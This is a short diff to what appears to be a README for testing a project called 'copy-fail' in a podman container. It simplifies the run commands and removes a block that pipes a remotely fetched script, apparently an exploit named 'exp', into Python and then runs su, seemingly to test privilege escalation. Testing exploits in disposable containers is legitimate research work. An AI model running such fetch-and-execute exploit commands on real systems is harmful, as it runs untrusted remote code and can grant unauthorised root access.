@@ -37,10 +37,5 @@ Test with podman
 
 ```sh
 podman build -t copy-fail .
-podman run -d --rm --name copy-fail --replace copy-fail
-podman exec -it copy-fail /bin/bash
-```
-
-```sh
-curl https://copy.fail/exp | python3.11 && su
+podman run -it --rm --name copy-fail --replace copy-fail
 ```
